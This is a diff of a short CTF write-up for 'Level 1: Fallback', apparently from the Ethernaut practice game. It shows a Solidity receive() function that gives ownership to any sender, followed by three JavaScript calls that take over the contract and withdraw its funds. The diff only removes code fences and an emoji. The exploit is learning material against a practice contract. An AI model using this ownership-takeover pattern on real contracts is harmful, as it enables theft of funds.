@@ -1,36 +1,35 @@
 # Level 1: Fallback
 
 **Date:** January 19, 2026
-**Status:** ✅ Done
+**Status:**  Done
 
 ## What I Found
 
 The fallback function lets anyone become owner by sending ETH.
 
 **The bug:**
-```solidity
+solidity
 receive() external payable {
     require(msg.value > 0 && contributions[msg.sender] > 0);
     owner = msg.sender; // Anyone can become owner!
 }
-```
 
 ## How I Exploited It
 
 1. Contributed tiny amount:
-```javascript
+javascript
 await contract.contribute({value: toWei("0.0001")})
-```
+
 
 2. Sent ETH to trigger fallback:
-```javascript
+javascript
 await contract.sendTransaction({value: toWei("0.0001")})
-```
+
 
 3. Became owner and withdrew:
-```javascript
+javascript
 await contract.withdraw()
-```
+
 
 ## What I Learned
 
